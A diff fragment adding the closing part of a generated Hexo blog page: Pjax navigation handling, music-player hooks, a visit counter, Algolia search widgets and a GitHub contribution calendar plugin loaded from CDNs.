+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
+            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
+            var git_user ="Bohemiana";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
